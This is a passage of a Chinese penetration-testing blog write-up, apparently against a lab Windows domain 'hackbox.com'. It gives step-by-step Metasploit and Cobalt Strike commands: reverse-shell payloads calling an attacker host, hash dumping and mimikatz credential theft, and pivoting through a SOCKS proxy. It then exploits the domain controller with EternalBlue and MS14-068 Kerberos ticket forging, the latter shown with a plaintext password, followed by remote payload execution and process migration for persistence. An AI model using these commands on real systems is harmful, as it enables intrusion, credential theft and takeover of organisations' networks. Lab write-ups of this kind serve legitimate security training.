+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先将msf上获得的session放到后台运行</span><br><span class="line">background</span><br><span class="line">然后使用 exploit/windows/local/payload_inject来注入一个新的payload到session中</span><br><span class="line"></span><br><span class="line">设置新的payload</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set LHOST 192.168.1.130    //cs主机地址</span><br><span class="line">set LPORT  4444    //随意设置监听端口，需要和cs保持一致</span><br><span class="line">set session 1    //设置需要派送的meterpreter</span><br><span class="line">set DisablePayloadHandler true    //禁止产生一个新的handler</span><br></pre></td></tr></table></figure>
+<p>回到cs上建立新的监听器</p>
+<p><img src="https://s2.loli.net/2022/04/30/9vabflcYkgpzPKM.png" alt="image-20220120150430253" /></p>
+<p>然后启用监听器</p>
+<p>在msf里面执行run</p>
+<p><img src="https://s2.loli.net/2022/04/30/Mje7ymPgDfVrQ3G.png" alt="image-20220120165018793" /></p>
+<p>成功上线</p>
+<p><img src="https://s2.loli.net/2022/04/30/XcxZl3NJPrjuy9V.png" alt="image-20220120165100753" /></p>
+<h3 id="文件上传msfcs"><a class="markdownIt-Anchor" href="#文件上传msfcs"></a> 文件上传–&gt;MSF–&gt;CS</h3>
+<p>打开MSF</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在msfvenom上生成攻击载荷</span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.130 LPORT=9999 -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">在MSF上进行监听</span><br><span class="line"></span><br><span class="line">use /multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set LHOST 0.0.0.0    //cs主机地址</span><br><span class="line">set LPORT  9999    //随意设置监听端口，需要和cs保持一致</span><br><span class="line">show options</span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>将msfvenom生成的shell.exe上传到目标中</p>
+<p>然后执行shell.exe的文件</p>
+<p>这时候会在msf收到session会话</p>
+<p>然后在将会话转发到cs上-就跟步骤二是一样的转发方式</p>
+<p>当然以上这些互相的转发时对于cs上线使用的都是http协议的但是对于Linux的payload中是没有http协议的payload的</p>
+<h2 id="00x6-对目标机器进行信息搜集"><a class="markdownIt-Anchor" href="#00x6-对目标机器进行信息搜集"></a> 00x6-对目标机器进行信息搜集</h2>
+<p>我们可以在MSF里面进行执行命令</p>
+<h3 id="查看一下基本的信息"><a class="markdownIt-Anchor" href="#查看一下基本的信息"></a> 查看一下基本的信息</h3>
+<h4 id="首先是获取用户的密码"><a class="markdownIt-Anchor" href="#首先是获取用户的密码"></a> 首先是获取用户的密码</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">还可以使用这个命令查看</span><br><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/30/AbnGFgmjDCEpl7s.png" alt="image-20220120171213964" /></p>
+<p>or</p>
+<p><img src="https://s2.loli.net/2022/04/30/HGiufWeOsRnt26Y.png" alt="image-20220120171525039" /></p>
+<p>也可以进入mimikatz交互（针对win开发的模块）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br></pre></td></tr></table></figure>
+<h4 id="查看其他配置及的证书文件"><a class="markdownIt-Anchor" href="#查看其他配置及的证书文件"></a> 查看其他配置及的证书文件</h4>
+<p>一般密码是由存在这里的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">creds_kerberos</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/30/fvLRVOMEUG1ZNsK.png" alt="image-20220120173002063" /></p>
+<h2 id="00x7-域渗透"><a class="markdownIt-Anchor" href="#00x7-域渗透"></a> 00x7-域渗透</h2>
+<h3 id="发现域"><a class="markdownIt-Anchor" href="#发现域"></a> 发现域</h3>
+<h4 id="进入交互shell"><a class="markdownIt-Anchor" href="#进入交互shell"></a> 进入交互shell</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/30/lR59v7itcUdzwkS.png" alt="image-20220120173645648" /></p>
+<h4 id="查看网卡信息"><a class="markdownIt-Anchor" href="#查看网卡信息"></a> 查看网卡信息</h4>
+<p><img src="https://s2.loli.net/2022/04/30/bVkGJ89vUSKBtH7.png" alt="image-20220120173702283" /></p>
+<h4 id="发现有乱码"><a class="markdownIt-Anchor" href="#发现有乱码"></a> 发现有乱码</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/30/nDXjE15gurvI6Rd.png" alt="image-20220120173729615" /></p>
+<p>然后就ok了</p>
+<h4 id="然后我们看到主机的dns解析的地址有一个hackboxcom"><a class="markdownIt-Anchor" href="#然后我们看到主机的dns解析的地址有一个hackboxcom"></a> <a target="_blank" rel="noopener" href="http://xn--DNShackbox-sf2pyp4gu5gk9tqihzloiiat29pd1ui3af8c460inv0aea516auv9p.com">然后我们看到主机的DNS解析的地址有一个hackbox.com</a></h4>
+<p><img src="https://s2.loli.net/2022/04/30/64QNJrzjhflc7yU.png" alt="image-20220120173906916" /></p>
+<h4 id="在看一下网卡的dns_server"><a class="markdownIt-Anchor" href="#在看一下网卡的dns_server"></a> 在看一下网卡的DNS_SERVER</h4>
+<p><img src="https://s2.loli.net/2022/04/30/JRW7fdVcSGLMN2Q.png" alt="image-20220120174005106" /></p>
+<h4 id="用其他的工具查看"><a class="markdownIt-Anchor" href="#用其他的工具查看"></a> 用其他的工具查看</h4>
+<p><img src="https://s2.loli.net/2022/04/30/xzE6fTRCISMFPZm.png" alt="image-20220120174152295" /></p>
+<p>不行继续换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_domains</span><br><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/I9R5Jesl8EBcupC.png" alt="image-20220120174327069" /></p>
+<p>or</p>
+<p><img src="https://s2.loli.net/2022/05/18/BuxKZDoACEbUFin.png" alt="image-20220120174455836" /></p>
+<p>确定是在dc域里面</p>
+<p><img src="https://s2.loli.net/2022/05/18/yOgjWsziLBNxZCw.png" alt="image-20220120174854966" /></p>
+<p>直接ping域控</p>
+<p><img src="https://s2.loli.net/2022/04/30/2yhO1JnVLdzZBmD.png" alt="image-20220120174951711" /></p>
+<p>这里发现的主机和上面查看到的是一样的、可以确定目标及确实是在一个dc的域控里面的、<a target="_blank" rel="noopener" href="http://xn--hackbox-py3k6kt98ao1dz4ii9eca1536bzml667dvo9d.com">且该域控的服务器域名为hackbox.com</a></p>
+<h3 id="域收集"><a class="markdownIt-Anchor" href="#域收集"></a> 域收集</h3>
+<h4 id="查看域"><a class="markdownIt-Anchor" href="#查看域"></a> 查看域</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/30/PSxJ3CKm78jB6cV.png" alt="image-20220120175824124" /></p>
+<h4 id="查看域内的主机"><a class="markdownIt-Anchor" href="#查看域内的主机"></a> 查看域内的主机</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:hackbox</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/30/4IX1ZMi86NEUcoB.png" alt="image-20220120175821297" /></p>
+<p>发现两台主机</p>
+<h4 id="查看域内工作组的信息"><a class="markdownIt-Anchor" href="#查看域内工作组的信息"></a> 查看域内工作组的信息</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/30/2mEU4vyiZhbxq81.png" alt="image-20220120180252733" /></p>
+<p>基本信息信息就这么多、然后使用MSF自带的功能</p>
+<h4 id="获取域内用户token"><a class="markdownIt-Anchor" href="#获取域内用户token"></a> 获取域内用户token</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_domain_tokens</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/30/tA9rX4MVDRfTYxE.png" alt="image-20220120180524838" /></p>
+<h4 id="查看目标windows上登录的用户"><a class="markdownIt-Anchor" href="#查看目标windows上登录的用户"></a> 查看目标Windows上登录的用户</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run enum_logged_on_users -l</span><br><span class="line"></span><br><span class="line">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/cktrNq2nWxMUQiD.png" alt="image-20220120193935329" /></p>
+<h3 id="进入dc域控"><a class="markdownIt-Anchor" href="#进入dc域控"></a> 进入dc域控</h3>
+<h4 id="在msf上设置路由"><a class="markdownIt-Anchor" href="#在msf上设置路由"></a> 在MSF上设置路由</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看全局路由器</span><br><span class="line">run get_local_subnets</span><br><span class="line">添加10段的路由信息</span><br><span class="line">run autoroute -s 10.10.10.0/24</span><br><span class="line">查看添加的路由表信息</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/Q1yEb7hOwUF2egP.png" alt="image-20220120195657323" /></p>
+<h4 id="设置代理"><a class="markdownIt-Anchor" href="#设置代理"></a> 设置代理</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line">设置代理</span><br><span class="line">set SRVPORT 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/Tn4fZieCQ1ScHMV.png" alt="image-20220120195908861" /></p>
+<p>还要记得本地设置代理信息</p>
+<h4 id="添加配置信息"><a class="markdownIt-Anchor" href="#添加配置信息"></a> 添加配置信息</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<p><img src="https://s2.loli.net/2022/05/18/UHZlsCtGjzWRNu3.png" alt="img" /></p>
+<h4 id="然后尝试访问"><a class="markdownIt-Anchor" href="#然后尝试访问"></a> 然后尝试访问</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ping 10.10.10.149</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/AwXVjDyLlfThpO7.png" alt="image-20220120200029342" /></p>
+<h3 id="扫描内网域控"><a class="markdownIt-Anchor" href="#扫描内网域控"></a> 扫描内网域控</h3>
+<h4 id="masscan扫描"><a class="markdownIt-Anchor" href="#masscan扫描"></a> masscan扫描</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 sudo masscan -p 1-65535 10.10.10.149 --rate=1000</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/8x3mpPbzK7RwMUZ.png" alt="image-20220120200832089" /></p>
+<h4 id="使用nmap进行探测"><a class="markdownIt-Anchor" href="#使用nmap进行探测"></a> 使用nmap进行探测</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 sudo nmap -sS -sC -A 10.10.10.149 -p 445,25,49162,3269,49155,47001,139,49153,49158,464,5722,9389,110,53,88,46154,135,636,3268,389,49157,593,49152,49174,49165 -oA 10.149-p</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/rvPuKtLixahmCAg.png" alt="image-20220120210951393" /></p>
+<h4 id="发现开放的有445端口"><a class="markdownIt-Anchor" href="#发现开放的有445端口"></a> 发现开放的有445端口</h4>
+<p>对于windowss-server的机器我们可以直接用永恒之蓝打一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/1qUlh9O7bzaVnYw.png" alt="image-20220120212008843" /></p>
+<p>先进行扫描查看是否能够利用漏洞</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/AlbI3rOy5JgH1iE.png" alt="image-20220120212320588" /></p>
+<p>使用</p>
+<p><img src="https://s2.loli.net/2022/05/18/AFY4d6V2LsZuyUI.png" alt="image-20220120212353046" /></p>
+<p>能够利用成功</p>
+<h3 id="ms17-010永恒之蓝打域控"><a class="markdownIt-Anchor" href="#ms17-010永恒之蓝打域控"></a> MS17-010永恒之蓝打域控</h3>
+<h4 id="使用ms17_010"><a class="markdownIt-Anchor" href="#使用ms17_010"></a> 使用ms17_010</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">show optoins</span><br><span class="line">设置payload</span><br><span class="line">可以有多个选择</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp     #但是一直连接不上去</span><br><span class="line">换一个</span><br><span class="line">set payload generic/shell_bind_tcp</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/eDaEALoKf3ucky5.png" alt="image-20220120213501710" /></p>
+<p>继续执行</p>
+<p><img src="https://s2.loli.net/2022/05/18/aN1Id9UATYzSGMi.png" alt="image-20220120213604904" /></p>
+<h4 id="结果"><a class="markdownIt-Anchor" href="#结果"></a> 结果</h4>
+<p><img src="https://s2.loli.net/2022/05/18/OxUX1YP9cwWB87S.png" alt="image-20220120213632256" /></p>
+<p>成功拿到dc域控的system的session会话</p>
+<p><img src="https://s2.loli.net/2022/05/18/8YDmpizgj3k4o2B.png" alt="image-20220121003920130" /></p>
+<h4 id="提权成功"><a class="markdownIt-Anchor" href="#提权成功"></a> 提权成功</h4>
+<h3 id="ms14-068域控提权-cve-2014-6324"><a class="markdownIt-Anchor" href="#ms14-068域控提权-cve-2014-6324"></a> MS14-068域控提权 CVE-2014-6324</h3>
+<h4 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h4>
+<p>域普通用户–&gt;创建票据–&gt;注入票据–&gt;访问dc的权限–&gt;域控超级管理员权限</p>
+<h5 id="域普通用户"><a class="markdownIt-Anchor" href="#域普通用户"></a> 域普通用户</h5>
+<p>我们需要一个域控里面的普通用户的账户密码</p>
+<p>在前面的信息搜集中、我们已经知道目前控制的这个用户机web是属于dc域控里面的一个主机的</p>
+<p>账户密码也在前面已经知道了、可以进行测试一下</p>
+<p>打开web机的3389、开启远程服务</p>
+<h6 id="连接测试"><a class="markdownIt-Anchor" href="#连接测试"></a> 连接测试</h6>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
+<p>150的web是已经开启了3389的我们直接测试就行</p>
+<p><img src="https://s2.loli.net/2022/05/18/PAHSoyYz8Jh2Ew5.png" alt="" /></p>
+<h6 id="打开"><a class="markdownIt-Anchor" href="#打开"></a> 打开</h6>
+<p><img src="https://s2.loli.net/2022/05/18/ijvwrVoDL7XOWsG.png" alt="image-20220120221642595" /></p>
+<h6 id="登录测试"><a class="markdownIt-Anchor" href="#登录测试"></a> 登录测试</h6>
+<p><img src="https://s2.loli.net/2022/05/18/REAoSz8GVd4jsTc.png" alt="image-20220120221710930" /></p>
+<h6 id="结果-2"><a class="markdownIt-Anchor" href="#结果-2"></a> 结果</h6>
+<p><img src="https://s2.loli.net/2022/05/18/Qcp7bijHGTzMLDs.png" alt="image-20220120221719690" /></p>
+<p>密码是对的但是web的用户在域控里面是没有3389权限的</p>
+<h6 id="尝试访问dc域控机器的c盘"><a class="markdownIt-Anchor" href="#尝试访问dc域控机器的c盘"></a> 尝试访问dc域控机器的C盘</h6>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/kjEXMSlehZND9L2.png" alt="image-20220120233217771" /></p>
+<h5 id="创建白银票据"><a class="markdownIt-Anchor" href="#创建白银票据"></a> 创建白银票据</h5>
+<h6 id="使用工具"><a class="markdownIt-Anchor" href="#使用工具"></a> 使用工具</h6>
+<p><img src="https://s2.loli.net/2022/05/18/3aLrhvIMzUx7EnV.png" alt="image-20220120222113163" /></p>
+<p>上传到目标机中</p>
+<p><img src="https://s2.loli.net/2022/05/18/n3VORhoDcef2mxq.png" alt="image-20220120222218898" /></p>
+<h6 id="执行-2"><a class="markdownIt-Anchor" href="#执行-2"></a> 执行</h6>
+<p><img src="https://s2.loli.net/2022/05/18/PzojOyvt4B87lEs.png" alt="image-20220120222319430" /></p>
+<h6 id="成功创建票据"><a class="markdownIt-Anchor" href="#成功创建票据"></a> 成功创建票据</h6>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/rb4VD7EcJ5PnhwQ.png" alt="image-20220120224251533" /></p>
+<p><img src="https://s2.loli.net/2022/05/18/iK2HwOvE18MVbn5.png" alt="image-20220120224644962" /></p>
+<h5 id="注入票据"><a class="markdownIt-Anchor" href="#注入票据"></a> 注入票据</h5>
+<h6 id="使用工具mimikatz"><a class="markdownIt-Anchor" href="#使用工具mimikatz"></a> 使用工具mimikatz</h6>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use mimikatz</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/H2x93BiFbozDtwE.png" alt="image-20220120230444681" /></p>
+<p>首先查看并清除之前的票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_list</span><br><span class="line">kerberos_ticket_purge</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/fsO7qpBSIUvX8hu.png" alt="image-20220120230630259" /></p>
+<p><img src="https://s2.loli.net/2022/05/18/IKnfA1u3wvr48UM.png" alt="image-20220120230524181" /></p>
+<p>导入票据</p>
+<p>但是我们发现msf6上的mimikatz模块依旧是没有导入票据的功能</p>
+<h6 id="使用工具-2"><a class="markdownIt-Anchor" href="#使用工具-2"></a> 使用工具</h6>
+<p><img src="https://s2.loli.net/2022/05/18/nlh249VmbOPdStM.png" alt="image-20220120232115297" /></p>
+<h6 id="将文件上传到目标机器上"><a class="markdownIt-Anchor" href="#将文件上传到目标机器上"></a> 将文件上传到目标机器上</h6>
+<p><img src="https://s2.loli.net/2022/05/18/X2cQ3bgnjDH1d7h.png" alt="image-20220120232151984" /></p>
+<h6 id="然后执行"><a class="markdownIt-Anchor" href="#然后执行"></a> 然后执行</h6>
+<p><img src="https://s2.loli.net/2022/05/18/3QykUlYXp5fgedH.png" alt="image-20220120232238438" /></p>
+<h6 id="对于票据的操作"><a class="markdownIt-Anchor" href="#对于票据的操作"></a> 对于票据的操作</h6>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list  #查看本机票据</span><br><span class="line">kerberos::purge  #删除本机所有票据</span><br><span class="line">kerberos::ptc TGT_web@hackbox.com.ccache  #导入TGT_web@hackbox.com.ccache</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/8Zm9SkNVxEsydpq.png" alt="image-20220120232511756" /></p>
+<h6 id="成功导入票据"><a class="markdownIt-Anchor" href="#成功导入票据"></a> 成功导入票据</h6>
+<p><img src="https://s2.loli.net/2022/05/18/eDx9zXk8tJPTLcU.png" alt="image-20220120232648016" /></p>
+<p>回到本机进行检查</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/8pYgazVWFiRZLhB.png" alt="image-20220120233257762" /></p>
+<h5 id="访问dc"><a class="markdownIt-Anchor" href="#访问dc"></a> 访问dc</h5>
+<h6 id="再次尝试访问dc域控的c盘文件"><a class="markdownIt-Anchor" href="#再次尝试访问dc域控的c盘文件"></a> 再次尝试访问dc域控的C盘文件</h6>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/U1O8R9lMcpETGwV.png" alt="image-20220120233406614" /></p>
+<h6 id="成功访问"><a class="markdownIt-Anchor" href="#成功访问"></a> 成功访问</h6>
+<p>目前只有访问文件的权限</p>
+<h5 id="获取域控超级管理员权限"><a class="markdownIt-Anchor" href="#获取域控超级管理员权限"></a> 获取域控超级管理员权限</h5>
+<p>在上面我们已经成功的访问dc域控的文件并且对于文件我们能够做到、复制、执行、的权限</p>
+<h6 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路：</h6>
+<p>生成一个正向代理的攻击文件、上传到目标机上、在将攻击载荷copy到dc域控机上、然后使用at命令执行文件、MSF监听、这样就能触发正向代理</p>
+<h6 id="生成攻击载荷"><a class="markdownIt-Anchor" href="#生成攻击载荷"></a> 生成攻击载荷</h6>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lport=7789 -f exe &gt;`pwd`/149.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/6bw5uGxIV3C1Wvh.png" alt="image-20220121000327012" /></p>
+<h6 id="上传到目标机"><a class="markdownIt-Anchor" href="#上传到目标机"></a> 上传到目标机</h6>
+<p><img src="https://s2.loli.net/2022/05/18/i1X4sWPg53Flr8O.png" alt="image-20220121000529576" /></p>
+<h6 id="将攻击载荷copy到dc域控机"><a class="markdownIt-Anchor" href="#将攻击载荷copy到dc域控机"></a> 将攻击载荷copy到dc域控机</h6>
+<p><img src="https://s2.loli.net/2022/05/18/TilcXFf4HPJytUO.png" alt="image-20220121000648739" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 149.exe \\dc\c$\149.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/FTeOAcrM25foEqu.png" alt="image-20220121000906111" /></p>
+<h6 id="使用at命令执行文件"><a class="markdownIt-Anchor" href="#使用at命令执行文件"></a> 使用at命令执行文件</h6>
+<p><img src="https://s2.loli.net/2022/05/18/LQRqrKJalXjeSP8.png" alt="image-20220121001141006" /></p>
+<p>就是相当于一个定时计划的命令</p>
+<p>先查看时间</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\dc</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/EC7AvcqonxLDQRk.png" alt="image-20220121001336592" /></p>
+<p>设置执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\dc 0:16:00 c:/149.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/q2mikcpMR84YOJP.png" alt="image-20220121001531819" /></p>
+<p>MSF监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">shwo options</span><br><span class="line">set lport 7789</span><br><span class="line">set rhost 10.10.10.149    #域控主机ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h6 id="成功上线"><a class="markdownIt-Anchor" href="#成功上线"></a> 成功上线</h6>
+<p><img src="https://s2.loli.net/2022/05/18/zIm96BYANy5VJgi.png" alt="image-20220121002747760" /></p>
+<p><img src="https://s2.loli.net/2022/05/18/8WvO69CkIePLYpq.png" alt="image-20220121003053486" /></p>
+<h6 id="进程迁移"><a class="markdownIt-Anchor" href="#进程迁移"></a> 进程迁移</h6>
+<p>建立持久会话、将进程迁移到service.exe的系统服务里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 448</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/wPNnv9rgxMOCjVG.png" alt="image-20220121003443540" /></p>
+<p>拿到MSF的session以后下面可以做的就是进行MSF与CS的联动</p>
+<p>方法还是和上面的一样</p>
+<h2 id="00x8-域攻击"><a class="markdownIt-Anchor" href="#00x8-域攻击"></a> 00x8-域攻击</h2>
+<h3 id="dc域信息搜集"><a class="markdownIt-Anchor" href="#dc域信息搜集"></a> dc域信息搜集</h3>
+<h4 id="密码搜集"><a class="markdownIt-Anchor" href="#密码搜集"></a> 密码搜集</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/VrpkOaiM5EF69uL.png" alt="image-20220121162020953" /></p>
+<p>出来的并不全</p>
+<p>使用另外的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/fQzFxOKh9suBbMy.png" alt="image-20220121162129435" /></p>
+<p>这里的所有用户以及所有的hash密码都已经到手了</p>
+<p>可以使用hash解密</p>
+<p>也可以先查看一下用户的证书信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use mimikatz</span><br><span class="line">creds_kerberos</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/b2lZNygWoATGDtx.png" alt="image-20220121162409938" /></p>
+<p>同时密码还能在这里看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/pUYmowHWiGfvbPR.png" alt="image-20220121163109583" /></p>
+<h4 id="用户sid搜集"><a class="markdownIt-Anchor" href="#用户sid搜集"></a> 用户SID搜集</h4>
